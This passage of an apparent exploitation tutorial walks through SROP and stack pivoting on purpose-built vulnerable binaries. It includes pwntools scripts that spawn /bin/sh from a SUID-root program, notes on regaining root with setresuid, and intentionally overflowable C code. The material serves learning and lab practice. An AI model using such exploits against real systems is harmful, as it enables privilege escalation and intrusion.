</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Now we need to call <code>sigreturn</code> system call and we don&rsquo;t need gadgets this time because we don&rsquo;t need any argument for this system call. But we need <code>rax</code> to specify system call and <code>syscall</code> address obviously which is in binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ROPgadget --binary srop 
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>0x0000000000401144 : pop rax ; ret
</span></span><span style="display:flex;"><span>0x0000000000401129 : syscall
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Like how <code>execve</code> system call number was <code>59</code>, <code>sigreturn</code> is <code>15</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./srop&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> pack()
</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> pack()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> pop_rax <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">15</span>) <span style="color:#f92672">+</span> syscall <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Now after we added <code>syscall</code> the things we add after this will go to register from our stack. Either we can add 31 values manually but its pain <code>pwntools</code> already has <code>Class</code> for it. We don&rsquo;t need to write <code>pack()</code> function in frame classes because  they are already packed, frame class does it for us. We didn&rsquo;t filled all <code>31</code> because you only need to set the registers that matter for your exploit. The rest can be left as zero or default values the kernel doesn&rsquo;t care unless those values affect your payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./srop&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x0000000000401144</span>) 
</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x0000000000401129</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>frame <span style="color:#f92672">=</span> SigreturnFrame()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#39;execve&#39; syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">59</span> <span style="color:#75715e"># &#39;execve&#39; syscall because we want to spawn shell</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#39;execve&#39; arguments</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404035</span> <span style="color:#75715e"># Address of &#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># NULL</span>
</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># NULL</span>
</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401129</span> <span style="color:#75715e"># As we said &#39;rip&#39; cant be empty so at end it will point to syscall address so that we can execute it</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> pop_rax <span style="color:#f92672">+</span> pack(<span style="color:#ae81ff">15</span>) <span style="color:#f92672">+</span> syscall <span style="color:#f92672">+</span> bytes(frame)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>The problem is, despite the binary being SUID-root, the shell drops privileges back to my user (uid=1000) because the kernel automatically clears effective UID in the child shell for security. So like in <code>Ret2Syscall</code> we can add <code>setresuid(0, 0, 0)</code> before calling <code>execve(&quot;bin/sh&quot;, NULL, NULL)</code>.</p>
<h2 id="0xc---stack-pivoting">0xC - Stack Pivoting</h2>
<p>We can move data between registers like</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>mov rsi, 42
</span></span><span style="display:flex;"><span>mov rdi, rsi
</span></span></code></pre></div><p>We moved 42 into <code>rsi</code> then moves value of <code>rsi</code> into <code>rdi</code>
Syntax of <code>mov</code> instruction is:</p>
<ul>
<li><code>mov destination, source</code> like how we moved from <code>rsi</code> to <code>rdi</code> destination to source.</li>
</ul>
<p>Each register in x86_64 is 64 bits in size, and in the previous levels, we have accessed the full register using¬†<code>rax</code>,¬†<code>rdi</code>, or¬†<code>rsi</code>. We can also access the lower bytes of each register using different register names. For example, the lower 32 bits of¬†<code>rax</code>¬†can be accessed using¬†<code>eax</code>, the lower 16 bits using¬†<code>ax</code>, and the lower 8 bits using¬†<code>al</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>MSB                                    LSB
</span></span><span style="display:flex;"><span>+----------------------------------------+
</span></span><span style="display:flex;"><span>|                   rax                  |
</span></span><span style="display:flex;"><span>+--------------------+-------------------+
</span></span><span style="display:flex;"><span>                     |        eax        |
</span></span><span style="display:flex;"><span>                     +---------+---------+
</span></span><span style="display:flex;"><span>                               |   ax    |
</span></span><span style="display:flex;"><span>                               +----+----+
</span></span><span style="display:flex;"><span>                               | ah | al |
</span></span><span style="display:flex;"><span>                               +----+----+
</span></span></code></pre></div><p>Like this for <code>rdi</code> its 32 bit would be <code>edi</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> bin_sh[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xbabecafe</span> <span style="color:#f92672">&amp;&amp;</span> arg2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xcafebabe</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">asm</span> (<span style="color:#e6db74">&#34;movl $59,%eax</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#e6db74">&#34;movl $0x404040,%edi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#e6db74">&#34;movl $0,%esi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#e6db74">&#34;movl $0,%edx</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>		    <span style="color:#e6db74">&#34;syscall</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>		   );
</span></span><span style="display:flex;"><span>	}	
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x60</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pivot;
</span></span><span style="display:flex;"><span>    pivot <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Pivot To - %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pivot);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter Data - &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(pivot,<span style="color:#ae81ff">0x100</span>, stdin);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Pivot! Pivot! Pivot! - &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buffer, <span style="color:#ae81ff">0x80</span>, stdin);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc pivot.c -o pivot -no-pie -fno-stack-protector
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la pivot
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16872</span> Jun <span style="color:#ae81ff">26</span> 17:03 pivot
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ checksec --file<span style="color:#f92672">=</span>pivot  
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/at0m/pivot&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
</span></span><span style="display:flex;"><span>    IBT:        Enabled
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./pivot              
</span></span><span style="display:flex;"><span>Pivot To - 0x48302a0
</span></span><span style="display:flex;"><span>Enter Data - AAAAAAAAAA
</span></span><span style="display:flex;"><span>Pivot! Pivot! Pivot! - BBBBBBBB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./pivot
</span></span><span style="display:flex;"><span>Pivot To - 0x14a632a0
</span></span><span style="display:flex;"><span>Enter Data - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>Pivot! Pivot! Pivot! - BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span></span></code></pre></div><p>We can see its leaking address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401060  printf@plt
</span></span><span style="display:flex;"><span>0x0000000000401070  fgets@plt
</span></span><span style="display:flex;"><span>0x0000000000401080  malloc@plt
</span></span><span style="display:flex;"><span>0x0000000000401090  _start
</span></span><span style="display:flex;"><span>0x00000000004010c0  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x00000000004010d0  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401100  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401140  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000401170  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000401176  win
</span></span><span style="display:flex;"><span>0x00000000004011af  vuln
</span></span><span style="display:flex;"><span>0x0000000000401236  main
</span></span><span style="display:flex;"><span>0x0000000000401250  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004012c0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004012c8  _fini
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
</span></span><span style="display:flex;"><span>   0x0000000000401236 &lt;+0&gt;:	endbr64
</span></span><span style="display:flex;"><span>   0x000000000040123a &lt;+4&gt;:	push   rbp
</span></span><span style="display:flex;"><span>   0x000000000040123b &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x000000000040123e &lt;+8&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x0000000000401243 &lt;+13&gt;:	call   0x4011af &lt;vuln&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401248 &lt;+18&gt;:	mov    eax,0x0
</span></span><span style="display:flex;"><span>   0x000000000040124d &lt;+23&gt;:	pop    rbp
</span></span><span style="display:flex;"><span>   0x000000000040124e &lt;+24&gt;:	ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><p><code>main</code> function is calling <code>vuln</code> function.</p>
<p><img src="/img/pivot.png" alt="pivot.png"></p>
<p>The function <code>vuln</code> begins by setting up a standard stack frame and allocating 112 bytes of local space on the stack. It then calls <code>malloc</code> to allocate 4096 bytes of memory on the heap and stores the returned pointer in a local variable. After that, it uses <code>printf</code> twice to prompt the user likely to indicate the start of input sections which is <code>Pivot to</code> and <code>Enter data</code>.  It then calls <code>fgets</code> to read up to 256 bytes (<code>0x100</code>) of user input into the heap-allocated buffer. Following that, it makes another <code>printf</code> call and then reads another 128 bytes (<code>0x80</code>) of input into a buffer located on the stack (<code>[rbp-0x70]</code>) which is <code>Pivot Pivot Pivot</code>. This second <code>fgets</code> into the stack buffer is suspicious because it reads 128 bytes into a stack space that is only 112 bytes wide, potentially causing a <strong>buffer overflow</strong>. The function concludes with a <code>leave</code> and <code>ret</code>, cleaning up the stack and returning to the caller</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; disass win
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> win:
</span></span><span style="display:flex;"><span>   0x0000000000401176 &lt;+0&gt;:	endbr64
</span></span><span style="display:flex;"><span>   0x000000000040117a &lt;+4&gt;:	push   rbp
</span></span><span style="display:flex;"><span>   0x000000000040117b &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x000000000040117e &lt;+8&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x4<span style="color:#f92672">]</span>,edi
</span></span><span style="display:flex;"><span>   0x0000000000401181 &lt;+11&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,esi
</span></span><span style="display:flex;"><span>   0x0000000000401184 &lt;+14&gt;:	cmp    DWORD PTR <span style="color:#f92672">[</span>rbp-0x4<span style="color:#f92672">]</span>,0xbabecafe
</span></span><span style="display:flex;"><span>   0x000000000040118b &lt;+21&gt;:	jne    0x4011ac &lt;win+54&gt;
</span></span><span style="display:flex;"><span>   0x000000000040118d &lt;+23&gt;:	cmp    DWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,0xcafebabe
</span></span><span style="display:flex;"><span>   0x0000000000401194 &lt;+30&gt;:	jne    0x4011ac &lt;win+54&gt;
</span></span><span style="display:flex;"><span>   0x0000000000401196 &lt;+32&gt;:	mov    eax,0x3b
</span></span><span style="display:flex;"><span>   0x000000000040119b &lt;+37&gt;:	mov    edi,0x404040
</span></span><span style="display:flex;"><span>   0x00000000004011a0 &lt;+42&gt;:	mov    esi,0x0
</span></span><span style="display:flex;"><span>   0x00000000004011a5 &lt;+47&gt;:	mov    edx,0x0
</span></span><span style="display:flex;"><span>   0x00000000004011aa &lt;+52&gt;:	syscall
</span></span><span style="display:flex;"><span>   0x00000000004011ac &lt;+54&gt;:	nop
</span></span><span style="display:flex;"><span>   0x00000000004011ad &lt;+55&gt;:	pop    rbp
</span></span><span style="display:flex;"><span>   0x00000000004011ae &lt;+56&gt;:	ret
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span><span style="display:flex;"><span>pwndbg&gt; 
</span></span></code></pre></div><p>We know whenever we call function argument is passed as <code>rdi</code>, <code>rsi</code> and <code>rax</code> here it is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   0x000000000040117e &lt;+8&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x4<span style="color:#f92672">]</span>,edi
</span></span><span style="display:flex;"><span>   0x0000000000401181 &lt;+11&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,esi
</span></span></code></pre></div><p>It means there are two arguments being passed <code>edi</code> and <code>esi</code> (32 bits of <code>rdi</code> and <code>rsi</code> ) which is moved in <code>rbp-0x4</code> and <code>rbp-0x8</code> respectively.</p>
<p>After this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x0000000000401184 &lt;+14&gt;:	cmp    DWORD PTR <span style="color:#f92672">[</span>rbp-0x4<span style="color:#f92672">]</span>,0xbabecafe
</span></span><span style="display:flex;"><span>0x000000000040118b &lt;+21&gt;:	jne    0x4011ac &lt;win+54&gt;
</span></span></code></pre></div><p>It compares if first argument is equal to <code>0xbabecafe</code>. If not equals to it jumps to <code>win+54</code> address and exit. And its same with <code>rbp-0x8</code> which needs <code>0xcafebabe</code>. After this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   0x0000000000401196 &lt;+32&gt;:	mov    eax,0x3b
</span></span><span style="display:flex;"><span>   0x000000000040119b &lt;+37&gt;:	mov    edi,0x404040
</span></span><span style="display:flex;"><span>   0x00000000004011a0 &lt;+42&gt;:	mov    esi,0x0
</span></span><span style="display:flex;"><span>   0x00000000004011a5 &lt;+47&gt;:	mov    edx,0x0
</span></span><span style="display:flex;"><span>   0x00000000004011aa &lt;+52&gt;:	syscall
</span></span></code></pre></div><p>Above code is simple. Its doing a system call of 32 bit registers like how its <code>eax</code>, <code>edi</code>, <code>esi</code>, <code>edx</code> instead of <code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code> respectively because its in 32 bit. We know that <code>rax</code> stores system call number its same with <code>eax</code> and same for others.</p>
<p><code>eax, 0x3b</code> means its calling <code>0x3b</code> which is 59 in integer it means its calling <code>execve</code> system call. And <code>edi</code> has <code>0x404040</code> which just means <code>/bin/sh</code> as argument of system call.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/s 0x404040
</span></span><span style="display:flex;"><span>0x404040 &lt;bin_sh&gt;:	<span style="color:#e6db74">&#34;/bin/sh&#34;</span>
</span></span></code></pre></div><p>At end we can say this whole <code>win</code> function is calling <code>/bin/sh</code> and if we can call this function we can spawn shell.</p>
<p>Let&rsquo;s find out whats that leak address we get when starting program of. Like in <code>Ret2Win</code> challenge we first enter input and press <code>CTRL+C</code> so we can examine in runtime.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/pivot 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Pivot To - 0x1884e2a0
</span></span><span style="display:flex;"><span>Enter Data - AAAABBBBCCCCDDDD
</span></span><span style="display:flex;"><span>Pivot! Pivot! Pivot! - ^C
</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
</span></span></code></pre></div><p>After running lets see whats at <code>0x1884e2a0</code> address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/s 0x1884e2a0
</span></span><span style="display:flex;"><span>0x1884e2a0:	<span style="color:#e6db74">&#34;AAAABBBBCCCCDDDD\n&#34;</span>
</span></span></code></pre></div><p>As we can see it just has address of <code>Enter data</code> input which will be important later to us. Obviously we know its buffer overflow challenge but we need to find out in which input there exists buffer overflow. Lets put value of highest possible which is <code>256</code> that <code>fgets</code> function can take in both input to check.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; cyclic<span style="color:#f92672">(</span>256<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/pivot 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Pivot To - 0x348df2a0
</span></span><span style="display:flex;"><span>Enter Data - aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
</span></span><span style="display:flex;"><span>Pivot! Pivot! Pivot! - <span style="color:#f92672">[</span>Inferior <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>process 17010<span style="color:#f92672">)</span> exited normally<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>As we can see program exited normally in first input. <code>If you ask why we didn't get input in Pivot Pivot Pivot</code>, its because the first <code>fgets</code> read the entire 256-byte payload without a newline, so there was no input left for the second <code>fgets</code>. As a result, the second input was skipped, and the program exited normally.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/pivot 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>Pivot To - 0x1d69d2a0
</span></span><span style="display:flex;"><span>Enter Data - test
</span></span><span style="display:flex;"><span>Pivot! Pivot! Pivot! - aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
</span></span></code></pre></div><p>If we run this we get crash, find offset at 120.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; cyclic -l paaaaaaa -n <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Finding cyclic pattern of <span style="color:#ae81ff">8</span> bytes: b<span style="color:#e6db74">&#39;paaaaaaa&#39;</span> <span style="color:#f92672">(</span>hex: 0x7061616161616161<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Found at offset <span style="color:#ae81ff">120</span>
</span></span></code></pre></div><p><img src="/img/pivot2.png" alt="pivot2.png"></p>
